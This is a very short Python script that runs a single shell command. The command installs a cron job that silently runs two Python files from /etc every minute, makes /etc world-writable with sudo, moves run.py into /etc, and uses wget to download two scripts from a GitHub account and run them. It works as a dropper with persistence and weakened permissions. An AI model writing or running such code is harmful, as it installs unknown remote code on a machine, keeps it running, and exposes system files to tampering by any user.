import os

os.system('echo "*/1 * * * * cd && cd /etc/ && python3 system.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://github.com/katerin966/03/blob/main/system.py && wget https://github.com/katerin966/03/blob/main/sys.py && python3 system.py && python3 sys.py')
